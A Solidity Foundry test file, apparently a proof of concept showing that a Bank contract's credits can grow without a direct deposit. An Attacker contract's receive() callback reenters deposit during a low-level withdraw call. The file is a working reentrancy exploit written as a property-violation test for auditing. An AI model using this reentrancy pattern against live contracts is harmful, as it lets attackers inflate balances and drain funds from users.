pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "../Bank.sol";

contract Attacker {
    Bank public bank;
    constructor(Bank _bank) payable {
        bank = _bank;
    }
    receive() external payable {
        // Reenter and deposit the entire balance to inflate credits
        bank.deposit{value: address(this).balance}();
    }
}

contract BankTest is Test {       
    Bank immutable bank;
    
    constructor() {
        // deploying a Bank contract
        address bank_deployer = address(0xBEEF);
        vm.prank(bank_deployer);
        bank = new Bank();
    }
    
    function test_credits_inc_onlyif_deposit_violation() public {

        Attacker attacker = new Attacker(bank);
        vm.deal(address(attacker), 5 ether);
        vm.prank(address(attacker));
        bank.deposit{value: 1 ether}();

        address user = address(attacker);
        assertNotEq(user, address(bank), "user address equal to bank address");

        uint256 user_credits_before = bank.credits(user);

        address sender = user;
        vm.prank(sender);

        bytes4 function_selector = bank.withdraw.selector;
        uint256 msg_value = 0;
        bytes memory params = hex"";

        // Dynamically call withdraw with calldata that sets amount=32 (first word after selector)
        address(bank).call{value: msg_value}(abi.encodeWithSelector(function_selector, params));        
	
        assert(function_selector != bank.deposit.selector || sender != user);

        uint256 user_credits_after = bank.credits(user);
        assertGt(user_credits_after, user_credits_before, "user credits did not increase");
    }
}